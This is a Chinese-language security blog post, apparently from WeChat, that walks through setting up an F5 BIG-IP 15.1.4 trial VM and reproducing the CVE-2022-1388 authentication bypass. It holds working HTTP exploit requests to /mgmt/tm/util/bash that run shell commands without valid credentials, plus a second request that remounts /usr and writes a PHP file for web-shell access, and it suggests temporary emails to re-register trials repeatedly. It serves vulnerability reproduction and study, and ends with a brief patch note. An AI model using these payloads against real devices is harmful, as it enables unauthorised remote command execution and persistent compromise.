<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/gDXu1WLz3O74c3TqLT7p_g)

**STATEMENT**

**声明**

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测及文章作者不为此承担任何责任。

雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

搭建过程

临时邮箱:https://mail.td/zh  
F5官网:

https://www.f5.com.cn/trials/big-ip-virtual-edition  
先去注册一个F5的账号，推荐使用临时邮箱，这样就可以一直注册了,注册网址：

**https://login.f5.com/resource/registerEmail.jsp**  
(复现CVE-2022-1388非必须，直接用虚拟机ova启动即可)可以直接看大标题‘导入虚拟机，复现CVE-2022-1388’  

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVWN1lhvh5QfNjxnmicyf34w4k0f12KWj6Qiba6HZgGYJtiag804ia1C4hKW3YO3omsictribLVicKRbnjGw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

随便填完第二步，Next即可，但是邮件发送极其的慢

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

之后会收到一封f5networks@f5.com的邮件，但打开却是空白，点击“邮件原文”就可以了

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

复制到浏览器打开，设置密码即可，自动跳转或者打开链接https://downloads.f5.com/trial/申请试用授权，验证码的地方是让输入黑色的字母

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

之后就可以等着了，发临时授权得30分钟左右，在这段时间可以去下载虚拟机安装的ova链接，https://downloads.f5.com/esd/product.jsp?sw=BIG-IP&pro=big-ip_v15.x  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

CVE-2022-1388的利用范围，我下载的是15.1.4

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

下载链接https://downloads.f5.com/esd/product.jsp?sw=BIG-IP&pro=big-ip_v15.x&ver=15.1.4

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

然后选择个下载节点就行了

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

在下载的时候，试用授权就到了临时邮箱

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**导入虚拟机，复现CVE-2022-1388**

虚拟机导入即可，命令行输入账户名及密码进入F5 配置模式，默认用户名root，密码default

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

https://ip/即可，admin密码是刚刚设置的root密码，再设置下密码

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

如果要对其他的功能点测试，导入试用授权即可

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

不过，CVE-2022-1388的漏洞点出现在登录认证的地方，不需要激活也可以复现

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
` ```POST /mgmt/tm/util/bash HTTP/1.1``Host: 10.20.57.149``Accept-Encoding: gzip, deflate``Accept: /``Connection: close, X-F5-Auth-Token, X-Forwarded-For, Local-Ip-From-Httpd,X-F5-New-Authtok-Reqd,X-Forwarded-Server,X-Forwarded-Host``X-F5-Auth-Token: aaaa``Authorization: Basic YWRtaW46``Content-Length: 46``{"command": "run", "utilCmdArgs": "-c 'id'"}`
```

**写shell**

可以写php、jsp的shell，但是需要先修改/usr的权限

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

之后蚁剑连接，

https://域名或ip/xui/common/scripts/jquery_1.3.2.php即可

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
`POST /mgmt/tm/util/bash HTTP/1.1``Host: 10.20.57.149Accept-Encoding: gzip, deflateAccept: */*Connection: close, X-F5-Auth-Token, X-Forwarded-For, Local-Ip-From-Httpd,X-F5-New-Authtok-Reqd,X-Forwarded-Server,X-Forwarded-HostX-F5-Auth-Token: aaaaaaAuthorization: Basic YWRtaW46Content-Length: 189{"command": "run", "utilCmdArgs": "-c \"mount -o remount -rw /usr;echo 'It works!' > /usr/local/www/xui/common/scripts/jquery_1.3.2.php;mount -o remount -r /usr\""}`
```

**修复建议**

参考漏洞影响范围，目前F5官方已给出解决方案，可升级至不受影响版本或参考官网文件进行修复

  

**安恒信息**

✦

杭州亚运会网络安全服务官方合作伙伴

成都大运会网络信息安全类官方赞助商

武汉军运会、北京一带一路峰会

青岛上合峰会、上海进博会

厦门金砖峰会、G20杭州峰会

支撑单位北京奥运会等近百场国家级

重大活动网络安保支撑单位

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

END

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**长按识别二维码关注我们**